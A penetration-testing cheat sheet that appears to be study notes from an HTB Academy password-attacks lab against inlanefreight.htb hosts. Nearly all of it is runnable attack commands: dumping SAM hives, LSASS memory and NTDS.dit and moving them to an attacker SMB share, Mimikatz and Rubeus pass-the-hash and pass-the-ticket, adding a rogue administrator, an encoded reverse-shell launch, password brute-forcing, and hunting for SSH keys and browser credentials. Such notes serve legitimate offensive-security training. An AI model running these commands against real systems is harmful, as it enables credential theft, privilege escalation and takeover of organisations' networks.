### **Connecting to Target**
1. Uses Evil-WinRM to establish a Powershell session with a target: `evil-winrm -i <ip> -u user -p password`
2. Uses smbclient to connect to an SMB share using a specified user: `smbclient -U user \\\\<ip>\\SHARENAME`
3. Uses smbserver.py to create a share on a linux-based attack host. Can be useful when needing to transfer files from a target to an attack host: `python3 smbserver.py -smb2support CompData /home/<nameofuser>/Documents/`
## **Password Mutations**
1. Uses cewl to generate a wordlist based on keywords present on a website: `cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`
2. Uses Hashcat to generate a rule-based word list: `hashcat --force password.list -r custom.rule --stdout > mut_password.list`
3. Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username: `./username-anarchy -i /path/to/listoffirstandlastnames.txt`
4. Uses Linux-based commands curl, awk, grep and tee to download a list of file extensions to be used in searching for files that could contain passwords: `curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt`
## **Attacking SAM**
1. Using reg.exe save to Copy Registry Hives:
    1. `reg.exe save hklm\sam C:\sam.save`
    2. `reg.exe save hklm\system C:\system.save`
    3. `reg.exe save hklm\security C:\security.save`
2. Creating a Share with smbserver.py: `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/`
3. Moving Hive Copies to Share: 
    1. `move sam.save \\10.10.15.16\CompData`
    2. `move security.save \\10.10.15.16\CompData`
    3. `move system.save \\10.10.15.16\CompData`
4. Dumping Hashes with Impacket's secretsdump.py: `ython3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`
5. Running Hashcat against NT Hashes: `sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt`
## **Remote Dumping & LSA Secrets Considerations**
With access to credentials with local admin privileges, it is also possible for us to target LSA Secrets over the network.
1. Dumping LSA Secrets Remotely: `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`
2. Dumping SAM Remotely: `crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`
## **Dumping LSASS Process Memory**
#### **Task Manager Method**
1. Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
2. A file called lsass.DMP is created and saved in: `C:\Users\loggedonusersdirectory\AppData\Local\Temp`
#### **Rundll32.exe & Comsvcs.dll Method**
1. Finding LSASS PID in cmd: `tasklist /svc`
2. Finding LSASS PID in PowerShell: `Get-Process lsass`
3. Creating lsass.dmp using PowerShell: `rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`
### **Using Pypykatz to Extract Credentials**
1. Running Pypykatz: `pypykatz lsa minidump /home/peter/Documents/lsass.dmp`
## **Attacking Active Directory & NTDS.dit**
1. Use [anrchy](https://github.com/urbanadventurer/username-anarchy) to convert real names into common username formats: `./username-anarchy -i /home/ltnbob/names.txt `
2. Launching the Attack with CrackMapExec: `crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt`
#### **Capturing NTDS.dit**
1. Connecting to a DC with Evil-WinRM: `evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'`
2. Checking Local Group Membership: `net localgroup`
3. Checking User Account Privileges including Domain: `net user bwilliamson`
4. Creating Shadow Copy of C: `vssadmin CREATE SHADOW /For=C:`
5. Copying NTDS.dit from the VSS: `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`
6. Transferring NTDS.dit to Attack Host: `cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData `
7. A Faster Method: Using cme to Capture NTDS.dit: `crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds`
8. Cracking a Single Hash with Hashcat: `sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt`
9. Pass-the-Hash Considerations: `evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"`
## **Credential Hunting in Windows**
1. Running Lazagne All: `start lazagne.exe all`
2. Using findstr: `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`
## **Credential Hunting in Linux**
1. Configuration Files: `for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`
2. Credentials in Configuration Files: `for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done`
3. Databases: `for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done`
4. Notes: `find /home/* -type f -name "*.txt" -o ! -name "*.*"`
5. Scripts: `for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done`
6. Cronjobs: `cat /etc/crontab `, `ls -la /etc/cron.*/`
7. SSH Private Keys: `grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"`
8. SSH Public Keys: `grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"`
9. Bash History: `tail -n5 /home/*/.bash*`
10. Logs: `for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done`
11. Memory - Mimipenguin: 
    1. `sudo python3 mimipenguin.py`
    2. `sudo bash mimipenguin.sh `
12. Memory - LaZagne: `sudo python2.7 laZagne.py all`
13. Firefox Stored Credentials:
    1. `ls -l .mozilla/firefox/ | grep default `
    2. `cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .`
14. Decrypting Firefox Credentials: `python3.9 firefox_decrypt.py`
15. Browsers - LaZagne: `python3 laZagne.py browsers`
### **Cracking Linux Credentials**
1. Unshadow:
    1. `sudo cp /etc/passwd /tmp/passwd.bak`
    2. `sudo cp /etc/shadow /tmp/shadow.bak`
    3. `unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes`
2. Hashcat - Cracking Unshadowed Hashes: `hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked`
3. Hashcat - Cracking MD5 Hashes: `hashcat -m 500 -a 0 md5-hashes.list rockyou.txt`
## **Pass the Hash (PtH)**
1. Pass the Hash from Windows Using Mimikatz: `mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit`
2. Pass the Hash with PowerShell Invoke-TheHash (Windows): 
    1. Invoke-TheHash with SMB:
        1. `Import-Module .\Invoke-TheHash.psd1`
        2. `Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose`
        3. Netcat Listener: `.\nc.exe -lvnp 8001`
        4. Visit https://www.revshells.com/, set IP 172.16.1.5 and port 8001, and select the option PowerShell #3 (Base64)
        5. `Import-Module .\Invoke-TheHash.psd1`
        6. `Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAG(...))"`
## **Pass the Hash with Impacket (Linux)**
1. Pass the Hash with Impacket PsExec: `impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453`
2. Pass the Hash with CrackMapExec (Linux): `crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453`
3. CrackMapExec - Command Execution: `crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami`
4. Pass the Hash with evil-winrm (Linux): `evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453`
5. Pass the Hash with RDP (Linux): 
    1. Enable Restricted Admin Mode to Allow PtH: `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
    2. Pass the Hash Using RDP: `xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B`
## **Pass the Ticket (PtT) from Windows**
1. Mimikatz - Export Tickets:
    1. `privilege::debug`
    2. `sekurlsa::tickets /export`
    3. `dir *.kirbi`
2. Rubeus - Export Tickets: `Rubeus.exe dump /nowrap`
3. Mimikatz - Extract Kerberos Keys:
    1. `privilege::debug`
    2. `sekurlsa::ekeys`
4. Mimikatz - Pass the Key or OverPass the Hash: 
    1. `privilege::debug`
    2. `sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f`
5. Rubeus - Pass the Key or OverPass the Hash: ` Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap`
6. Rubeus Pass the Ticket: `Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt`
7. Rubeus - Pass the Ticket: `Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi`
8. Convert .kirbi to Base64 Format: `[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`
9. Pass the Ticket - Base64 Format: `Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/<SNIP>`
10. Mimikatz - Pass the Ticket:
    1. `privilege::debug`
    2. `kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"`
## **Pass The Ticket with PowerShell Remoting (Windows)**
1. Mimikatz - Pass the Ticket for Lateral Movement
    1. `mimikatz.exe`
    2. `privilege::debug`
    3. `kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"`
2. Rubeus - PowerShell Remoting with Pass the Ticket: `Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show`
3. Rubeus - Pass the Ticket for Lateral Movement: `Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt`
## **Pass the Ticket (PtT) from Linux**
1. realm - Check If Linux Machine is Domain Joined: `realm list`
2. PS - Check if Linux Machine is Domain Joined: `ps -ef | grep -i "winbind\|sssd"`
3. Using Find to Search for Files with Keytab in the Name: `find / -name *keytab* -ls 2>/dev/null`
4. Identifying Keytab Files in Cronjobs: `crontab -l`
5. Reviewing Environment Variables for ccache Files: `env | grep -i krb5`
6. Searching for ccache Files in /tmp: `ls -la /tmp`
7. Listing keytab File Information: `klist -k -t /opt/specialfiles/carlos.keytab `
8. Impersonating a User with a keytab:
    1. `klist`
    2. `kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab`
    3. `klist`
9. Connecting to SMB Share: `smbclient //dc01/carlos -k -c ls`
10. Keytab Extract: `python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab`
11. Log in as user: `su - carlos@inlanefreight.htb`
## **Using Linux Attack Tools with Kerberos**
1. Download Chisel to our Attack Host
2. Connect to MS01 with xfreerdp
3. Execute chisel from MS01
4. Setting the KRB5CCNAME Environment Variable: `export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133`
5. Using Impacket with proxychains and Kerberos Authentication: `proxychains impacket-wmiexec dc01 -k`
6. To use evil-winrm with Kerberos, we need to install the Kerberos package used for network authentication. 
    1. `sudo apt-get install krb5-user -y`
    2. In case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.confn case the package krb5-user is already installed, we need to change the configuration file /etc/krb5.conf:
    ```bash
     [libdefaults]
        default_realm = INLANEFREIGHT.HTB

    <SNIP>

    [realms]
        INLANEFREIGHT.HTB = {
            kdc = dc01.inlanefreight.htb
        }
    ```
    3. Using Evil-WinRM with Kerberos: `proxychains evil-winrm -i dc01 -r inlanefreight.htb`
7. Impacket Ticket Converter: `impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi`
8. Importing Converted Ticket into Windows Session with Rubeus: `C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi`
### **Linikatz**
1. Linikatz Download and Execution: `wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh`
2. `/opt/linikatz.sh`
## **Hunting for Encoded Files**
1. Hunting for Files: `for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done`
#### Hunting for **SSH**
1. Hunting for SSH Keys: `grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"`
2. Encrypted SSH Keys: `cat /home/cry0l1t3/.ssh/SSH.private`
3. John Hashing Scripts: `ssh2john.py SSH.private > ssh.hash`
4. Cracking SSH Keys: `john --wordlist=rockyou.txt ssh.hash`
#### **Cracking Microsoft Office Documents**
1. `office2john.py Protected.docx > protected-docx.hash`
2. `cat protected-docx.hash`
3. `john --wordlist=rockyou.txt protected-docx.hash`
#### **Cracking PDFs**
1. `pdf2john.py PDF.pdf > pdf.hash`
2. `john --wordlist=rockyou.txt pdf.hash`
#### **Cracking ZIP**
1. `zip2john ZIP.zip > zip.hash`
2. `john --wordlist=rockyou.txt zip.hash`
#### **Cracking OpenSSL Encrypted Archives**
1. Using a for-loop to Display Extracted Contents: `for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done`
#### **Cracking BitLocker Encrypted Drives**
1. `bitlocker2john -i Backup.vhd > backup.hashes`
2. `grep "bitlocker\$0" backup.hashes > backup.hash`
3. `hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked`
